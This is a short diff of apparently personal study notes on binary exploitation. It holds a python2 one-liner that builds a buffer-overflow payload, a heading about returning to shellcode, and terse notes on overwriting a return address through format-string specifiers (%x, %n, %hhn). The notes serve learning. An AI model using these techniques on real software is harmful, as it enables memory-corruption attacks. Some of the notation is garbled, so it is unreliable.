@@ -31,3 +31,11 @@ python2 -c "print 'a'*20 + '\x00\x53\x5c\x59' + 'a'*12 +
 SHELL CODE로 리턴하기 >
 
 
+tmpbuffer
+	RET
+		%x %x.... %n
+			Override = 4 bytes
+				1 byte = %hhn Higer 4 bytes are same just lower 4 bytes
+			$hhn$nx$hhn
+			![[Screenshot 2024-10-31 at 3.37.55 PM.png]]
+				
